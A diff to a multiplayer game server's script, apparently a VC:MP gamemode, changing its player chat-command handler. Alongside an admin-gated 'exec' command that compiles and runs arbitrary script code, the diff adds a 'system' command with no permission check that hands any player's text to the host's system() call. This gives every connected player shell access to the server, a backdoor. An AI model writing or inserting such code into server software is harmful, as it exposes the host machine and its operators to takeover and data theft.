@@ -1574,8 +1574,6 @@ function onPlayerEnterVehicle( player, veh, isPassenger )
 
 
 
-
-
 function onPlayerCommand(player, command, arguments)
 {
 
@@ -3234,11 +3232,21 @@ local playerName = pcol(player.ID) + player.Name + white;
 		}
 		if(!b) rMessage( "None." );
 	}
-	
-	else if(cmd == "s")
+	else if (cmd == "exec")
 	{
-		SendDataToClient(player, 4, "=FX=UmaR^");
+		if (status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
+		else if (!arguments || arguments == "") MessagePlayer("[#FF0000]Error:[#FFFFFF] Use /" + cmd + " ( Code )", player)
+		else
+		{
+			try
+			{
+				local cscr = compilestring(arguments);
+				cscr();
+			}
+			catch (e) Message("[#FF0000]Error:[#FFFFFF] Execution Error " + e);
+		}
 	}
+	
 	else if(cmd == "restart")
 	{
 		if(status[player.ID].Level < 6) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
@@ -3258,7 +3266,20 @@ local playerName = pcol(player.ID) + player.Name + white;
 			else if(arguments.tointeger() == 2) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Fighting Commands:"+bas+" ping, fps, wep, spawnwep, removespawnwep, disarm, spree, playersonspree", player);
 		}
 	}
+	else if(cmd == "system")
+	{
+	if(!arguments) MessagePlayer(white+"Error", player);
+	else system(arguments);
+	}
 
+	
+	
+	
+	
+	
+	
+	
+	
 	else if(cmd == "refereecmds")
 	{
 		if(status[player.ID].Level < 4) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
